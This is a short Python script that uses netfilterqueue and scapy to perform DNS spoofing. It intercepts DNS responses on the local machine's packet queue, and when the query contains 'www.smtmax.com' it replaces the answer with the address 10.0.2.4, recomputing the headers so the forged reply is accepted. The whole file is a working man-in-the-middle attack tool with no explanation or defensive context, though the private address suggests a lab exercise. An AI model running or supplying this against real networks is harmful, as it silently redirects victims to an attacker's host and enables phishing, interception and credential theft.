import netfilterqueue
import scapy.all as scapy
def process_packet(packet):
    sacapy_packet = scapy.IP(packet.get_payload())
    if sacapy_packet.haslayer(scapy.DNSRR):
        qname = sacapy_packet[scapy.DNSQR].qname
        if "www.smtmax.com" in qname.decode():
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.4")
            sacapy_packet[scapy.DNS].an = answer
            sacapy_packet[scapy.DNS].ancount = 1

            del sacapy_packet[scapy.IP].len
            del sacapy_packet[scapy.IP].chksum
            del sacapy_packet[scapy.UDP].chksum
            del sacapy_packet[scapy.UDP].len

            packet.set_payload(bytes(sacapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()